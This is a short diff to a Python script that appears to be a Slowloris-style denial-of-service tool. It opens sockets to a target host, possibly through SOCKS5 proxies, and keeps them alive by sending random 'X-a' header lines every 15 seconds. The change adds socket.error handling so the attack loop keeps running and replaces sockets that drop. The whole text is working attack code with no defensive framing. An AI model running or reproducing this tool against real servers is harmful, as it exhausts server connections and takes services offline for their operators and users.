@@ -110,7 +110,10 @@ def main():
                     s = MainThread(argus.host,argus.port).run()             
                 except socks.SOCKS5Error:
                     break
+                except socket.error:
+                    break
                 socket_list.append(s)
+                
             while True:
                 print "\tSending Keep Alive Headers... Socket Count: %s"%(len(socket_list))
                 for s in list(socket_list):
@@ -118,12 +121,16 @@ def main():
                         s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                     except socks.SOCKS5Error:
                         socket_list.remove(s)
+                    except socket.error:
+                        socket_list.remove(s)
                 for i in range(int(max_socket) - len(socket_list)):
                     try:
                         s = MainThread(argus.host,argus.port).run()
                         if s:
                             socket_list.append(s)
                     except socks.SOCKS5Error:
+                        break
+                    except socket.error:
                         break
                 time.sleep(15)
                 
